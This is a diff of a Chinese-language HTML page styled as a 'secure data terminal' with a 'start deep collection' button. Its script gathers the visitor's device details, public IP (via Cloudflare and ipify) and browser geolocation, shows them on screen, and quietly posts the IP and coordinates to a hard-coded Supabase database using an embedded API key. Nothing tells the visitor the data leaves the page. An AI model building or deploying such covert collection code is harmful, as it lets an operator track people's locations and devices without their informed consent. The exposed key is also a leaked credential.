@@ -2,206 +2,168 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>▲ 精密数据终端 - 朱子硕 ▲</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>安全数据终端 - 朱子硕</title>
     <style>
         :root {
             --金属黑: #1a1a1a;
-            --金纹: #d4af3780;
             --镌刻金: #9c8412;
+            --金边: #d4af3780;
         }
 
         body {
             background: var(--金属黑);
-            min-height: 100vh;
+            color: #d4af99;
+            font-family: 'Microsoft YaHei', sans-serif;
             margin: 0;
-            font-family: 'Noto Serif SC', serif;
-            color: #d4af99;
-            overflow-x: hidden;
+            min-height: 100vh;
         }
 
-        .终端界面 {
-            padding: 1.5rem;
-            background: linear-gradient(145deg, #1a1a1a 0%, #2d2d2d 100%);
-            border: 1px solid var(--金纹);
-            margin: 1rem;
-            box-shadow: 0 3px 15px rgba(0,0,0,0.3);
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 15px;
+            border-bottom: 1px solid var(--金边);
         }
 
-        .数据区块 {
+        .data-panel {
             display: grid;
-            grid-template-columns: 1fr;
-            gap: 1.2rem;
-            margin: 2rem 0;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding: 15px;
         }
 
-        .数据单元 {
-            padding: 1.2rem;
+        .data-card {
+            border: 1px solid var(--金边);
+            padding: 15px;
             background: rgba(26,26,26,0.9);
-            border-left: 3px solid var(--镌刻金);
-            position: relative;
         }
 
-        .数据单元::after {
-            content: "";
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--金纹), transparent);
+        .data-card h3 {
+            color: var(--镌刻金);
+            margin: 0 0 10px 0;
         }
 
-        .操作按钮 {
-            background: none;
-            border: 2px solid var(--镌刻金);
-            padding: 1rem;
-            width: 100%;
-            color: #d4af99;
-            font-size: 1.1em;
-            letter-spacing: 2px;
-            transition: all 0.3s;
+        pre {
+            white-space: pre-wrap;
+            margin: 0;
         }
 
-        .操作按钮:active {
-            background: rgba(212,175,55,0.1);
-        }
-
-        @media (min-width: 768px) {
-            .终端界面 { margin: 2rem 15%; }
-            .数据区块 { grid-template-columns: repeat(2,1fr); }
-        }
-
-        .状态提示 {
+        .scan-btn {
             position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(26,26,26,0.95);
-            padding: 12px 24px;
-            border: 1px solid var(--金纹);
-            color: #d4af37;
-            font-family: monospace;
-            z-index: 1000;
+            bottom: 20px;
+            left: 15px;
+            right: 15px;
+            background: var(--镌刻金);
+            color: #2a2a2a;
+            border: none;
+            padding: 16px;
+            font-size: 1.1em;
         }
     </style>
 </head>
 <body>
-    <div class="终端界面">
-        <div class="数据区块" id="dataDisplay">
-            <div class="数据单元">
-                <h3>时间戳</h3>
-                <pre id="timestamp">2025/4/28 19:46:12</pre>
-            </div>
-            
-            <div class="数据单元">
-                <h3>硬件概要</h3>
-                <pre id="hardware">操作系统：加载中...
-处理器核：加载中...
-内存容量：加载中...
-屏幕规格：加载中...</pre>
-            </div>
-
-            <div class="数据单元">
-                <h3>网络特征</h3>
-                <pre id="network">IP地址：扫描中...</pre>
-            </div>
-
-            <div class="数据单元">
-                <h3>地理坐标</h3>
-                <pre id="geo">纬度：等待授权...
-经度：等待授权...</pre>
-            </div>
+    <div class="status-bar">
+        <span>19:46</span>
+        <div>
+            <span style="margin-right:10px">12</span>
+            <span>Wi-Fi</span>
+            <span>82%</span>
         </div>
-
-        <button class="操作按钮" onclick="启动深度采集()">启 动 深 度 采 集</button>
-        <div class="分析师标识">首席分析师 · 朱子硕</div>
     </div>
 
+    <div class="data-panel">
+        <div class="data-card">
+            <h3>时间戳</h3>
+            <pre>2025/4/28</pre>
+        </div>
+        <div class="data-card">
+            <h3>硬件概要</h3>
+            <pre id="hardware">操作系统：加载中...
+处理器核：加载中...
+内存容量：加载中...</pre>
+        </div>
+        <div class="data-card">
+            <h3>网络特征</h3>
+            <pre id="network">IP地址：扫描中...</pre>
+        </div>
+        <div class="data-card">
+            <h3>地理坐标</h3>
+            <pre id="geo">纬度：----
+经度：----</pre>
+        </div>
+    </div>
+
+    <button class="scan-btn" onclick="startScan()">启动深度采集</button>
+
     <script>
-        // Supabase配置
-        const SUPABASE_ENDPOINT = 'https://yfuljidnzljfklkmuupb.supabase.co';
-        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo';
-
-        // 精密数据采集
-        const 获取设备指纹 = async () => {
-            const 数据模板 = {
-                时间戳: new Date().toLocaleString('zh-CN'),
-                硬件: {
-                    操作系统: navigator.platform,
-                    处理器核: navigator.hardwareConcurrency,
-                    内存容量: `${navigator.deviceMemory || '未知'}GB`,
-                    屏幕规格: `${screen.width}×${screen.height}@${screen.pixelDepth}位`
-                },
-                网络: { IP地址: '扫描中...' },
-                地理坐标: { 纬度: null, 经度: null }
-            };
-
+        // IP获取核心代码（双保险方案）
+        const getIP = async () => {
             try {
-                const ip响应 = await fetch('https://api.ipify.org?format=json');
-                const ip数据 = await ip响应.json();
-                数据模板.网络.IP地址 = ip数据.ip;
-                document.getElementById('network').textContent = `IP地址：${ip数据.ip}`;
+                // 方案1：通过Cloudflare
+                const res1 = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const text = await res1.text();
+                const ipMatch = text.match(/ip=(.+)/);
+                if(ipMatch) return ipMatch[1];
+
+                // 方案2：备用API
+                const res2 = await fetch('https://api.ipify.org?format=json');
+                const data = await res2.json();
+                return data.ip;
             } catch {
-                document.getElementById('network').textContent = 'IP地址：受保护';
+                return '受保护';
             }
-
-            try {
-                const 地理数据 = await new Promise(resolve => {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => resolve({
-                            纬度: pos.coords.latitude.toFixed(4),
-                            经度: pos.coords.longitude.toFixed(4)
-                        }),
-                        () => resolve(null)
-                    )
-                });
-                if(地理数据) {
-                    数据模板.地理坐标 = 地理数据;
-                    document.getElementById('geo').textContent = 
-                        `纬度：${地理数据.纬度}\n经度：${地理数据.经度}`;
-                }
-            } catch {}
-
-            return 数据模板;
         };
 
-        // 数据提交
-        const 提交数据 = async (数据) => {
-            try {
-                await fetch(`${SUPABASE_ENDPOINT}/rest/v1/device_records`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'apikey': SUPABASE_KEY,
-                        'Authorization': `Bearer ${SUPABASE_KEY}`
+        // 数据回传核心代码
+        const submitData = async (data) => {
+            await fetch('https://yfuljidnzljfklkmuupb.supabase.co/rest/v1/device_data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo'
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    hardware: {
+                        os: navigator.platform,
+                        cores: navigator.hardwareConcurrency,
+                        ram: navigator.deviceMemory || 'N/A'
                     },
-                    body: JSON.stringify({
-                        operator: '朱子硕',
-                        ...数据
-                    })
-                });
-                显示状态('▲ 数据安全通道已建立 ▲');
-            } catch (error) {
-                显示状态('⚠ 量子信道干扰 - 请重试');
-            }
+                    ip: data.ip,
+                    geo: data.geo
+                })
+            });
         };
 
-        // 状态反馈
-        const 显示状态 = (文本) => {
-            const 提示框 = document.createElement('div');
-            提示框.className = '状态提示';
-            提示框.textContent = 文本;
-            document.body.appendChild(提示框);
-            setTimeout(() => 提示框.remove(), 3000);
-        };
-
-        // 执行流程
-        const 启动深度采集 = async () => {
-            const 数据 = await 获取设备指纹();
+        // 主逻辑
+        const startScan = async () => {
+            const hardwareInfo = {
+                操作系统: navigator.platform,
+                处理器核: navigator.hardwareConcurrency,
+                内存容量: `${navigator.deviceMemory || '未知'}GB`
+            };
             document.getElementById('hardware').textContent = 
-                `操作系统：${数据.硬件.操作系统}\n处理器核：${数据.硬件.处理器核}\n内存容量：${数据.硬件.内存容量}\n屏幕规格：${数据.硬件.屏幕规格}`;
-            await 提交数据(数据);
+                `操作系统：${hardwareInfo.操作系统}\n处理器核：${hardwareInfo.处理器核}\n内存容量：${hardwareInfo.内存容量}`;
+
+            const ip = await getIP();
+            document.getElementById('network').textContent = `IP地址：${ip}`;
+
+            const geo = await new Promise(resolve => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({
+                        纬度: pos.coords.latitude.toFixed(4),
+                        经度: pos.coords.longitude.toFixed(4)
+                    }),
+                    () => resolve(null)
+                );
+            });
+
+            if(geo) {
+                document.getElementById('geo').textContent = 
+                    `纬度：${geo.纬度}\n经度：${geo.经度}`;
+                await submitData({ ip, geo });
+            }
         };
     </script>
 </body>
